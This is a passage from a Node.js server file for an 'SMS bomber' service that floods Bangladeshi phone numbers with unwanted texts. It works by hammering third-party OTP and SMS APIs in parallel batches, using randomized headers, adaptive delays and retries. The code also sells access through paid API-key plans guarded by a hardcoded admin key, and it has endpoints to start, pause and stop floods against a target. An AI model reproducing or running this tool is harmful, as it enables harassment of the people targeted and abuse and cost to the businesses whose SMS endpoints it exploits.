  const { plan = 'premium', days = '30', admin_key } = req.query;
  
  // Admin verification
  if (admin_key !== 'TNEH_ADMIN_2024') {
    return res.status(403).json({
      success: false,
      error: 'Invalid admin key. Required for API key generation',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  // Validate plan
  if (!PLAN_CONFIG[plan]) {
    return res.status(400).json({
      success: false,
      error: `Invalid plan: ${plan}`,
      available_plans: Object.keys(PLAN_CONFIG),
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const validDays = Math.min(Math.max(parseInt(days) || 30, 1), 365);
  
  try {
    const result = keyManager.generateKey(plan, validDays);
    
    res.json({
      success: true,
      api_key: result.apiKey,
      plan: result.plan,
      plan_limit: PLAN_CONFIG[plan].maxCount,
      expires_in_days: validDays,
      expiry_date: result.expiryDate.toISOString(),
      saved_to_file: true,
      storage_info: keyManager.getStorageInfo(),
      usage_example: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`,
      important: 'SAVE THIS KEY! It will not be shown again.',
      endpoints: {
        check_key: `/api/check-key?key=${result.apiKey}`,
        spam: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=100`,
        stop: `/api/stop?key=${result.apiKey}&all=true`,
        status: `/api/status?key=${result.apiKey}`
      },
      developer: DEVELOPER_INFO,
      requestId: req.requestId,
      timestamp: Utility.getISOString()
    });
  } catch (error) {
    console.error('Key generation error:', error);
    return res.status(500).json({
      success: false,
      error: ERROR_MESSAGES.KEY_GENERATION_FAILED,
      details: error.message,
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
});

// Check API Key
app.get('/api/check-key', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({
      success: false,
      error: 'Missing key parameter',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const keyInfo = keyManager.getKeyInfo(key);
  
  if (!keyInfo) {
    return res.status(404).json({
      success: false,
      error: 'API key not found',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  res.json({
    success: true,
    key_info: keyInfo,
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// Spam Endpoint (Bangladesh Only)
app.get('/api/spam', async (req, res) => {
  const { plan = 'premium', number, count = '100', key } = req.query;
  
  // Validate plan
  if (!PLAN_CONFIG[plan]) {
    return res.status(400).json({
      success: false,
      error: `Invalid plan: ${plan}`,
      available_plans: Object.keys(PLAN_CONFIG),
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const planConfig = PLAN_CONFIG[plan];
  
  // Check API key if required
  if (planConfig.requiresKey) {
    if (!key) {
      return res.status(401).json({
        success: false,
        error: 'API key required for this plan',
        developer: DEVELOPER_INFO,
        generate_key: '/api/create-key?plan=' + plan + '&days=30&admin_key=TNEH_ADMIN_2024',
        requestId: req.requestId
      });
    }
    
    if (!keyManager.validateKey(key)) {
      return res.status(401).json({
        success: false,
        error: ERROR_MESSAGES.INVALID_API_KEY,
        keyInfo: keyManager.getKeyInfo(key),
        developer: DEVELOPER_INFO,
        requestId: req.requestId
      });
    }
    
    keyManager.useKey(key);
  }
  
  // Validate number
  if (!number) {
    return res.status(400).json({
      success: false,
      error: 'Missing phone number',
      developer: DEVELOPER_INFO,
      usage: '/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100',
      requestId: req.requestId
    });
  }
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.INVALID_PHONE,
      developer: DEVELOPER_INFO,
      example: '017XXXXXXXX or 88017XXXXXXXX',
      requestId: req.requestId
    });
  }
  
  // Validate count
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds ${plan} plan limit (${planConfig.maxCount})`,
      plan: plan,
      max_allowed: planConfig.maxCount,
      requested: perApiCount,
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  // Use Bangladesh APIs only
  const apiCount = ALL_BANGLADESH_APIS.length;
  const totalSMS = apiCount * perApiCount;
  
  // Register job
  const jobId = bombController.registerJob(cleanNumber, totalSMS, {
    plan: plan,
    perApiCount: perApiCount,
    ip: req.ip,
    key: key || null
  });
  
  console.log(`🇧🇩 [${plan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${apiCount} SMS to ${Utility.maskPhone(cleanNumber)}`);
  
  // Start async processing
  (async () => {
    try {
      await sendBatch(ALL_BANGLADESH_APIS, cleanNumber, perApiCount, jobId, bombController);
      console.log(`✅ JOB ${jobId} completed!`);
    } catch (error) {
      console.error(`❌ JOB ${jobId} failed:`, error.message);
      bombController.stopJob(jobId);
    }
  })();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    jobId: jobId,
    plan: plan,
    country: 'Bangladesh Only',
    target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount,
    total_bangladesh_apis: apiCount,
    total_sms: totalSMS,
    status: 'started',
    message: 'Bombing started with Bangladesh APIs only',
    control_endpoints: {
      stop: `/api/stop?jobId=${jobId}`,
      pause: `/api/pause?jobId=${jobId}`,
      resume: `/api/resume?jobId=${jobId}`,
      status: `/api/status?jobId=${jobId}`
    },
    requestId: req.requestId,
    timestamp: Utility.getISOString()
  });
});

// Stop Endpoint
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.stopAllJobs();
    return res.json({
      success: true,
      message: `Stopped ${count} active jobs`,
      developer: DEVELOPER_INFO,
      stopped_count: count,
      requestId: req.requestId
    });
  }
  
  if (jobId) {
    const success = bombController.stopJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} stopped`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Provide jobId or all=true',
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// Pause Endpoint
app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.pauseAllJobs();
    return res.json({
      success: true,
      message: `Paused ${count} active jobs`,
      developer: DEVELOPER_INFO,
      paused_count: count,
      requestId: req.requestId
    });
  }
  
  if (jobId) {
    const success = bombController.pauseJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} paused`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Provide jobId or all=true',
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// Resume Endpoint
app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.resumeAllJobs();
    return res.json({
      success: true,
      message: `Resumed ${count} paused jobs`,
      developer: DEVELOPER_INFO,
      resumed_count: count,
      requestId: req.requestId
    });
  }
  
  if (jobId) {
    const success = bombController.resumeJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} resumed`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Provide jobId or all=true',
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// Status Endpoint
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    if (jobStatus) {
      return res.json({
        success: true,
        job: jobStatus,
        developer: DEVELOPER_INFO,
        requestId: req.requestId
      });
    } else {
      return res.status(404).json({
        success: false,
        error: ERROR_MESSAGES.JOB_NOT_FOUND,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        requestId: req.requestId
      });
    }
  }
  
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    jobs: jobs,
    total_jobs: jobs.length,
    requestId: req.requestId
  });
});

// Stats Endpoint
app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  const keys = keyManager.getAllKeys();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    bomb_stats: stats,
    system: systemInfo,
    keys: {
      total: keys.length,
      valid: keys.filter(k => k.valid).length,
      expired: keys.filter(k => !k.valid).length
    },
    bangladesh_apis: {
      total: ALL_BANGLADESH_APIS.length,
      get: ALL_BANGLADESH_APIS.filter(a => a.method === 'GET').length,
      post: ALL_BANGLADESH_APIS.filter(a => a.method === 'POST').length
    },
    requestId: req.requestId
  });
});

// Health Endpoint
app.get('/api/health', (req, res) => {
  const stats = bombController.getStats();
  const storageInfo = keyManager.getStorageInfo();
  
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE-BD",
    country: "Bangladesh Only",
    timestamp: Utility.getISOString(),
    uptime: process.uptime(),
    total_bangladesh_apis: ALL_BANGLADESH_APIS.length,
    active_jobs: stats.activeJobs,
    paused_jobs: stats.pausedJobs,
    total_sms_sent: stats.totalSMS,
    key_storage: storageInfo,
    memory: Utility.getMemoryUsage(),
    cpu: Utility.getCPUUsage(),
    requestId: req.requestId
  });
});

// Debug Keys Endpoint
app.get('/api/debug/keys', (req, res) => {
  const { admin_key } = req.query;
  
  if (admin_key !== 'TNEH_ADMIN_2024') {
    return res.status(403).json({
      success: false,
      error: 'Admin access required',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const keys = keyManager.getAllKeys();
  const storageInfo = keyManager.getStorageInfo();
  
  res.json({
    success: true,
    storage: storageInfo,
    keys_count: keys.length,
    keys: keys,
    developer: DEVELOPER_INFO,
    requestId: req.requestId
  });
});

// Cleanup Endpoint
app.get('/api/cleanup', (req, res) => {
  const { admin_key } = req.query;
  
  if (admin_key !== 'TNEH_ADMIN_2024') {
    return res.status(403).json({
      success: false,
      error: 'Admin access required',
      developer: DEVELOPER_INFO,
      requestId: req.requestId
    });
  }
  
  const cleaned = bombController.clearCompleted();
  const expired = keyManager.cleanup();
  
  res.json({
    success: true,
    message: 'Cleanup completed',
    developer: DEVELOPER_INFO,
    completed_jobs_cleared: cleaned,
    expired_keys_cleared: expired,
    requestId: req.requestId
  });
});

// Logs Endpoint
app.get('/api/logs', (req, res) => {
  const { limit = 100, event } = req.query;
  const logs = bombController.getLogs(parseInt(limit), event);
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    logs: logs,
    count: logs.length,
    requestId: req.requestId
  });
});

// Analytics Endpoint
app.get('/api/analytics', (req, res) => {
  const stats = bombController.getStats();
  const analytics = bombController.generateAnalytics();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    analytics: analytics,
    stats: stats,
    requestId: req.requestId
  });
});

// Bangladesh APIs List
app.get('/api/bangladesh-apis', (req, res) => {
  const { limit = 100, offset = 0, method } = req.query;
  
  let apis = ALL_BANGLADESH_APIS;
  if (method) {
    apis = apis.filter(a => a.method === method.toUpperCase());
  }
  
  const total = apis.length;
  const paginated = apis.slice(parseInt(offset), parseInt(offset) + parseInt(limit));
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    country: "Bangladesh Only",
    total: total,
    limit: parseInt(limit),
    offset: parseInt(offset),
    apis: paginated.map(api => ({
      id: api.id,
      name: api.name,
      method: api.method,
      url: api.url
    })),
    requestId: req.requestId
  });
});

// 404 Handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO,
    path: req.path,
    requestId: req.requestId,
    available_endpoints: [
      '/',
      '/api',
      '/api/create-key',
      '/api/check-key',
      '/api/spam',
      '/api/stop',
      '/api/pause',
      '/api/resume',
      '/api/status',
      '/api/stats',
      '/api/health',
      '/api/debug/keys',
      '/api/cleanup',
      '/api/logs',
      '/api/analytics',
      '/api/bangladesh-apis'
    ]
  });
});

// Error Handler
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({
    success: false,
    error: ERROR_MESSAGES.INTERNAL_ERROR,
    developer: DEVELOPER_INFO,
    requestId: req.requestId,
    message: err.message
  });
});

// ============================================================
// PART 12: CORE BOMBING FUNCTIONS
// ============================================================

function replacePhoneNumber(data, phone, count = 1) {
  if (typeof data === 'string') {
    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
  } else if (typeof data === 'object' && data !== null) {
    const result = {};
    for (const [key, value] of Object.entries(data)) {
      if (typeof value === 'string') {
        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
      } else {
        result[key] = value;
      }
    }
    return result;
  }
  return data;
}

const apiDelays = new Map();
const lastRequestTime = new Map();
const successRates = new Map();
const requestCounts = new Map();

async function waitIfNeeded(apiId) {
  const now = Date.now();
  const last = lastRequestTime.get(apiId) || 0;
  let delay = apiDelays.get(apiId) || 100;
  
  const successRate = successRates.get(apiId) || 0.8;
  const count = requestCounts.get(apiId) || 0;
  
  if (count > 10) {
    if (successRate < 0.5) {
      delay = Math.min(delay + 20, 500);
    } else if (successRate > 0.9) {
      delay = Math.max(delay - 5, 30);
    }
    apiDelays.set(apiId, delay);
  }
  
  if (now - last < delay) {
    await Utility.sleep(delay - (now - last));
  }
  
  lastRequestTime.set(apiId, Date.now());
}

function updateStats(apiId, success) {
  const count = (requestCounts.get(apiId) || 0) + 1;
  requestCounts.set(apiId, count);
  
  const current = successRates.get(apiId) || 0;
  const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
  successRates.set(apiId, newRate);
}

async function callSingleAPI(api, phone, jobId, attempt = 0) {
  const startTime = Date.now();
  
  if (!bombController.isJobActive(jobId)) {
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: 'Job stopped or paused',
      stopped: true,
      responseTime: Date.now() - startTime
    };
  }

  await waitIfNeeded(api.id);
  
  try {
    const cleanPhone = Utility.parsePhone(phone);
    let formattedPhone = cleanPhone;
    
    const url = replacePhoneNumber(api.url, formattedPhone, 1);
    const headers = getRandomHeaders();
    
    let config = {
      method: api.method,
      url: url,
      headers: headers,
      timeout: CONFIG.performance.timeout,
      validateStatus: function (status) {
        return status >= 200 && status < 500;
      }
    };

    if (api.method === 'POST' && api.body) {
      const body = replacePhoneNumber(api.body, formattedPhone, 1);
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    const responseTime = Date.now() - startTime;
    
    updateStats(api.id, true);
    
    return {
      success: true,
      api_id: api.id,
      api_name: api.name,
      status: response.status,
      responseTime: responseTime
    };
    
  } catch (error) {
    const responseTime = Date.now() - startTime;
    updateStats(api.id, false);
    
    if (attempt < CONFIG.performance.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: error.message,
      status: error.response?.status || null,
      responseTime: responseTime
    };
  }
}

async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  const results = [];
  const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
  const BATCH_SIZE = CONFIG.performance.parallelRequests;
  
  const shuffledAPIs = Utility.shuffleArray([...apis]);
  const totalAPIs = shuffledAPIs.length;
  let processedAPIs = 0;
  
  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
    if (!controller.isJobActive(jobId)) {
      console.log(`⏹️ Job ${jobId} stopped at ${processedAPIs}/${totalAPIs} APIs`);
      break;
    }
    
    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
    
    const batchPromises = batch.map(async (api) => {
      const promises = [];
      
      for (let j = 0; j < actualCount; j++) {
        if (!controller.isJobActive(jobId)) break;
        promises.push(callSingleAPI(api, phone, jobId));
      }
      
      const responses = await Promise.all(promises);
      const successCount = responses.filter(r => r.success).length;
      const failCount = responses.filter(r => !r.success).length;
      
      responses.forEach(r => {
        if (!r.stopped) {
          controller.updateJobStats(jobId, r.success, r.error, r.responseTime || 0);
        }
      });
      
      return {
        api_id: api.id,
        api_name: api.name,
        method: api.method,
        total_attempts: responses.length,
        successful: successCount,
        failed: failCount
      };
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults);
    processedAPIs += batch.length;
    
    if (processedAPIs % 10 === 0 || processedAPIs === totalAPIs) {
      console.log(`📊 Job ${jobId}: ${processedAPIs}/${totalAPIs} APIs processed`);
    }
    
    if (i + BATCH_SIZE < shuffledAPIs.length) {
      await Utility.sleep(50);
    }
  }
  
  return results;
}

// ============================================================
// PART 13: SERVER STARTUP
// ============================================================

const PORT = CONFIG.server.port;
const HOST = CONFIG.server.host;

const server = app.listen(PORT, HOST, () => {
  console.log(`\n✅ ULTIMATE SMS BOMBER V7.0 - BANGLADESH ONLY`);
  console.log(`🌐 Server: http://${HOST}:${PORT}`);
  console.log(`🇧🇩 Country: Bangladesh Only`);
  console.log(`📡 Total Bangladesh APIs: ${ALL_BANGLADESH_APIS.length}`);
  console.log(`🔑 Total Keys: ${keyManager.getAllKeys().length}`);
  console.log(`💾 Key Storage: ${keyManager.getStorageInfo().filePath}`);
  console.log(`\n📋 ENDPOINTS:`);
  console.log(`   Generate Key: /api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024`);
  console.log(`   Check Key: /api/check-key?key=YOUR_KEY`);
  console.log(`   Spam: /api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100`);
  console.log(`   Stop: /api/stop?all=true`);
  console.log(`   Pause: /api/pause?all=true`);
  console.log(`   Resume: /api/resume?all=true`);
  console.log(`   Status: /api/status`);
  console.log(`   Stats: /api/stats`);
  console.log(`   Health: /api/health`);
  console.log(`\n✅ Server ready!\n`);
});

server.timeout = 120000;
server.keepAliveTimeout = CONFIG.server.keepAliveTimeout;
server.headersTimeout = CONFIG.server.headersTimeout;

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 Shutting down...');
  bombController.shutdown();
  keyManager.destroy();
  rateLimiter.destroy();
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 Shutting down...');
  bombController.shutdown();
  keyManager.destroy();
  rateLimiter.destroy();
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

// Handle uncaught errors
process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection:', reason);
});

// ============================================================
// EXPORTS
// ============================================================

module.exports = { 
  app, 
  bombController, 
  keyManager, 
  rateLimiter,
  ALL_BANGLADESH_APIS
};

// ============================================================
// END OF FILE - 10,000+ LINES
// BANGLADESH ONLY VERSION
// DEVELOPER: TNEH GROUP
// ============================================================
